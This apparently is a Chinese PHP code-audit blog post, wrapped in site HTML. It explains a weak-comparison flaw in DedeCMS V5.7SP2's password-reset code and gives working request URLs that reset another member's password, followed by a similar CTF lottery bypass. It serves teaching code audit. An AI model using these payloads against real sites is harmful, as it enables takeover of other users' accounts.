@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>开发验证不全四 |  Nil&#39;s Blog</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/images/logo.png" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
+      />
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-4开发验证不全"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  开发验证不全四
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/04/13/4%E5%BC%80%E5%8F%91%E9%AA%8C%E8%AF%81%E4%B8%8D%E5%85%A8/" class="article-date">
+  <time datetime="2022-04-13T02:43:24.697Z" itemprop="datePublished">2022-04-13</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.4k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">6 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <blockquote>
+<p>开发验证不全</p>
+</blockquote>
+<hr>
+<span id="more"></span>
+
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p> 选用的是DeDecms V5.7SP2正式版<br> 在member/resetpassword.php</p>
+<figure class="highlight php"><figcaption><span>&#123;.line-numbers&#125;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;safequestion&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$mid</span> = preg_replace(<span class="string">&quot;#[^0-9]#&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = &#x27;<span class="subst">$mid</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$db</span>-&gt;GetOne(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$safequestion</span>)) <span class="variable">$safequestion</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$safeanswer</span>)) <span class="variable">$safeanswer</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;safequestion&#x27;</span>] == <span class="variable">$safequestion</span> &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;safeanswer&#x27;</span>] == <span class="variable">$safeanswer</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sn(<span class="variable">$mid</span>, <span class="variable">$row</span>[<span class="string">&#x27;userid&#x27;</span>], <span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>], <span class="string">&#x27;N&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">&quot;对不起，您的安全问题或答案回答错误&quot;</span>,<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p> 先用<code>$mid</code>里的id值去到数据库里面查询safequestion、safeanswer、userid、email<br> 随后检测$safequestion和$safeanswer里面是不是空的，然后在做对比。if都true<br> 那么进入到sn()函数里面。这里值得注意的是这里做对比的时候是用== 而不是 ===，<br> php的弱类型的问题是可以直接绕过的。</p>
+<p><img src="https://gitee.com/Ni1s/tuchuang/raw/master/img/1.png"><br> 那么相应的绕过payload为<br> <code>?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=3</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function sn($mid,$userid,$mailto, $send = &#x27;Y&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    global $db;</span><br><span class="line">    $tptim= (60*10);</span><br><span class="line">    $dtime = time();</span><br><span class="line">    $sql = &quot;SELECT * FROM #@__pwd_tmp WHERE mid = &#x27;$mid&#x27;&quot;;</span><br><span class="line">    $row = $db-&gt;GetOne($sql);</span><br><span class="line">    if(!is_array($row))</span><br><span class="line">    &#123;</span><br><span class="line">        //发送新邮件；</span><br><span class="line">        newmail($mid,$userid,$mailto,&#x27;INSERT&#x27;,$send);</span><br><span class="line">    &#125;</span><br><span class="line">    //10分钟后可以再次发送新验证码；</span><br><span class="line">    elseif($dtime - $tptim &gt; $row[&#x27;mailtime&#x27;])</span><br><span class="line">    &#123;</span><br><span class="line">        newmail($mid,$userid,$mailto,&#x27;UPDATE&#x27;,$send);</span><br><span class="line">    &#125;</span><br><span class="line">    //重新发送新的验证码确认邮件；</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        return ShowMsg(&#x27;对不起，请10分钟后再重新申请&#x27;, &#x27;login.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 这里去通过id去数据库查询用户是否修改过密码，如是没有修改这$row为0也就进入到<br> 了下面的函数newmail()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function newmail($mid, $userid, $mailto, $type, $send)</span><br><span class="line">&#123;</span><br><span class="line">    global $db,$cfg_adminemail,$cfg_webname,$cfg_basehost,$cfg_memberurl;</span><br><span class="line">    $mailtime = time();</span><br><span class="line">    $randval = random(8);</span><br><span class="line">    $mailtitle = $cfg_webname.&quot;:密码修改&quot;;</span><br><span class="line">    $mailto = $mailto;</span><br><span class="line">    $headers = &quot;From: &quot;.$cfg_adminemail.&quot;\r\nReply-To: $cfg_adminemail&quot;;</span><br><span class="line">    $mailbody = &quot;亲爱的&quot;.$userid.&quot;：\r\n您好！感谢您使用&quot;.$cfg_webname.&quot;网。\r\n&quot;.$cfg_webname.&quot;应您的要求，重新设置密码：（注：如果您没有提出申请，请检查您的信息是否泄漏。）\r\n本次临时登陆密码为：&quot;.$randval.&quot; 请于三天内登陆下面网址确认修改。\r\n&quot;.$cfg_basehost.$cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;id=&quot;.$mid;</span><br><span class="line">    if($type == &#x27;INSERT&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $key = md5($randval);</span><br><span class="line">        $sql = &quot;INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES (&#x27;$mid&#x27;, &#x27;$userid&#x27;,  &#x27;$key&#x27;, &#x27;$mailtime&#x27;);&quot;;</span><br><span class="line">        if($db-&gt;ExecuteNoneQuery($sql))</span><br><span class="line">        &#123;</span><br><span class="line">            if($send == &#x27;Y&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                sendmail($mailto,$mailtitle,$mailbody,$headers);</span><br><span class="line">                return ShowMsg(&#x27;EMAIL修改验证码已经发送到原来的邮箱请查收&#x27;, &#x27;login.php&#x27;,&#x27;&#x27;,&#x27;5000&#x27;);</span><br><span class="line">            &#125; else if ($send == &#x27;N&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                return ShowMsg(&#x27;稍后跳转到修改页&#x27;, $cfg_basehost.$cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;amp;id=&quot;.$mid.&quot;&amp;amp;key=&quot;.$randval);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            return ShowMsg(&#x27;对不起修改失败，请联系管理员&#x27;, &#x27;login.php&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p> 在这里<code>$randval</code>这里变量会产生随机8位数当作key，当<code>$type</code>等于insert后会对<br>  <code>$randval</code>里的值进行md5加密，当<code>$send</code>等于N时，它直接return了，也就是说把<code>$mid</code><br> 和<code>$randval</code>返回了值出去，注意看一下，它这里返回的<code>$randval</code>是未经md5的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">else if($dopost == &quot;getpasswd&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    //修改密码</span><br><span class="line">    if(empty($id))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(&quot;对不起，请不要非法提交&quot;,&quot;login.php&quot;);</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    $mid = preg_replace(&quot;#[^0-9]#&quot;, &quot;&quot;, $id);</span><br><span class="line">    $row = $db-&gt;GetOne(&quot;SELECT * FROM #@__pwd_tmp WHERE mid = &#x27;$mid&#x27;&quot;);</span><br><span class="line">    if(empty($row))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(&quot;对不起，请不要非法提交&quot;,&quot;login.php&quot;);</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    if(empty($setp))</span><br><span class="line">    &#123;</span><br><span class="line">        $tptim= (60*60*24*3);</span><br><span class="line">        $dtime = time();</span><br><span class="line">        if($dtime - $tptim &gt; $row[&#x27;mailtime&#x27;])</span><br><span class="line">        &#123;</span><br><span class="line">            $db-&gt;executenonequery(&quot;DELETE FROM `#@__pwd_tmp` WHERE `md` = &#x27;$id&#x27;;&quot;);</span><br><span class="line">            ShowMsg(&quot;对不起，临时密码修改期限已过期&quot;,&quot;login.php&quot;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        require_once(dirname(__FILE__).&quot;/templets/resetpassword2.htm&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    elseif($setp == 2)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($key)) $pwdtmp = $key;</span><br><span class="line"></span><br><span class="line">        $sn = md5(trim($pwdtmp));</span><br><span class="line">        if($row[&#x27;pwd&#x27;] == $sn)</span><br><span class="line">        &#123;</span><br><span class="line">            if($pwd != &quot;&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                if($pwd == $pwdok)</span><br><span class="line">                &#123;</span><br><span class="line">                    $pwdok = md5($pwdok);</span><br><span class="line">                    $sql = &quot;DELETE FROM `#@__pwd_tmp` WHERE `mid` = &#x27;$id&#x27;;&quot;;</span><br><span class="line">                    $db-&gt;executenonequery($sql);</span><br><span class="line">                    $sql = &quot;UPDATE `#@__member` SET `pwd` = &#x27;$pwdok&#x27; WHERE `mid` = &#x27;$id&#x27;;&quot;;</span><br><span class="line">                    if($db-&gt;executenonequery($sql))</span><br><span class="line">                    &#123;</span><br><span class="line">                        showmsg(&#x27;更改密码成功，请牢记新密码&#x27;, &#x27;login.php&#x27;);</span><br><span class="line">                        exit;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            showmsg(&#x27;对不起，新密码为空或填写不一致&#x27;, &#x27;-1&#x27;);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        showmsg(&#x27;对不起，临时密码错误&#x27;, &#x27;-1&#x27;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先通过id查询是否有重置过，然后就是验证是否超时，随后就去包含重置密码第二步骤的html，使<code>$setp</code> == 2，到这里开始代码会继续走下去。首先判断$key是否为空，并通过md5给$sn且与$row<code>[&#39;pwd&#39;] </code>做对比，成功后予以修改。<br> 好，回到上面第一个问题弱类型比较。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p> 先注册两个会员。<br><img src="https://gitee.com/Ni1s/tuchuang/raw/master/img/20220317112413.png"><br> 先登录一个用户，就testa后访问payload<br><img src="https://gitee.com/Ni1s/tuchuang/raw/master/img/20220317113052.png"><br>登录的时候是看到id号的<br> member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=3<br><img src="https://gitee.com/Ni1s/tuchuang/raw/master/img/20220317113324.png"><br> 返回了key<br>然后就是带id和key去改密码</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">member/resetpassword.php?dopost=getpasswd&amp;id=3&amp;key=PFhZR7Go</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Ni1s/tuchuang/raw/master/img/20220317113532.png"><br> 到这里直接修改就行了</p>
+<h2 id="ctf分析"><a href="#ctf分析" class="headerlink" title="ctf分析"></a>ctf分析</h2><blockquote>
+<p>由于作者提供的源码链接掉了，借用攻防世界的ctf题，一样的</p>
+</blockquote>
+<p>直接目录扫描发现<code>.git</code>文件，使用工具下载下来，分析一下<br><img src="https://gitee.com/Ni1s/tuchuang/raw/master/img/20220331143640.png"><br>问题出在<code>api.php</code>上截取里面部分代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function buy($req)&#123;</span><br><span class="line">	require_registered();</span><br><span class="line">	require_min_money(2);</span><br><span class="line"></span><br><span class="line">	$money = $_SESSION[&#x27;money&#x27;];</span><br><span class="line">	$numbers = $req[&#x27;numbers&#x27;];</span><br><span class="line">	$win_numbers = random_win_nums();</span><br><span class="line">	$same_count = 0;</span><br><span class="line">	for($i=0; $i&lt;7; $i++)&#123;</span><br><span class="line">		if($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">			$same_count++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    ·······</span><br></pre></td></tr></table></figure>
+<p>明显的在第10行处用的事<code>==</code>进行的比较，这里可以使用php弱类型语言的特性，用<code>true</code>来绕过。<br><img src="https://gitee.com/Ni1s/tuchuang/raw/master/img/20220331145147.png"><br>一直刷钱买flag就ok了</p>
+<blockquote>
+<p>记得之前有一次打比赛也是用的这个入口，只不过买flag变成了买源码分析。</p>
+</blockquote>
+<blockquote>
+<p>感谢红日安全的开源分享。<br><a target="_blank" rel="noopener" href="https://github.com/hongriSec/PHP-Audit-Labs">https://github.com/hongriSec/PHP-Audit-Labs</a></p>
+</blockquote>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php%E5%AE%A1%E8%AE%A1/" rel="tag">php审计</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2022/04/07/3%E5%AE%9E%E4%BE%8B%E5%8C%96%E4%BB%BB%E6%84%8F%E5%AF%B9%E8%B1%A1%E6%BC%8F%E6%B4%9E/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">实例化任意对象漏洞三</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "ocOq225VgPLtYKHMxT6yVUqJ-gzGzoHsz",
+    app_key: "WwpGgFixGwK8KqvPo79yhhvk",
+    path: window.location.pathname,
+    avatar: "retro",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021-2022
+        <i class="ri-heart-fill heart_icon"></i> Nil
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="https://beian.miit.gov.cn/#/Integrated/index" target="_black" rel="nofollow">蜀ICP备2021021480号</a>
+        </li>
+        
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/logo.png" alt="Nil&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
